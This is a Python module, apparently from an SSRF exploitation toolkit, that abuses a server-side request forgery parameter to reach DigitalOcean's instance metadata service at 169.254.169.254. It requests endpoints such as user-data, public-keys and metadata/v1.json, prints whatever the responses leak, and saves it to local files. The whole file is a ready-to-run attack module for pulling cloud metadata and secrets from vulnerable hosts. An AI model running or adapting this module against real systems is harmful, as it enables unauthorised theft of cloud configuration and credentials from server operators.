from core.utils import *
import logging
import os

name          = "digitalocean"
description   = "Access sensitive data from the Digital Ocean provider"
author        = "Swissky"
documentation = ["https://developers.digitalocean.com/documentation/metadata/"]

class exploit():
    endpoints = set()

    def __init__(self, requester, args):
        logging.info(f"Module '{name}' launched !")
        self.add_endpoints()

        r = requester.do_request(args.param, "")
        if r != None:
            default = r.text

            # Create directory to store files
            directory = requester.host
            # Replace : with _ for window folder name safe
            # https://www.ibm.com/docs/en/spectrum-archive-sde/2.4.1.0?topic=tips-file-name-characters
            directory =  directory.replace(':','_')
            if not os.path.exists(directory):
                os.makedirs(directory)

            for endpoint in self.endpoints:
                payload = wrapper_http(endpoint[1], endpoint[0] , "80")
                r  = requester.do_request(args.param, payload)
                diff = diff_text(r.text, default)
                if diff != "":

                    # Display diff between default and ssrf request
                    logging.info(f"\033[32mReading file\033[0m : {payload}")
                    print(diff)

                    # Write diff to a file
                    filename = endpoint[1].split('/')[-1]
                    logging.info(f"\033[32mWriting file\033[0m : {payload} to {directory + '/' + filename}")
                    with open(directory + "/" + filename, 'w') as f:
                        f.write(diff)


    def add_endpoints(self):
        self.endpoints.add( ("169.254.169.254","metadata/v1/id") )
        self.endpoints.add( ("169.254.169.254","metadata/v1/user-data") )
        self.endpoints.add( ("169.254.169.254","metadata/v1/hostname") )
        self.endpoints.add( ("169.254.169.254","metadata/v1/region") )
        self.endpoints.add( ("169.254.169.254","metadata/v1/public-keys") )
        self.endpoints.add( ("169.254.169.254","metadata/v1.json") )
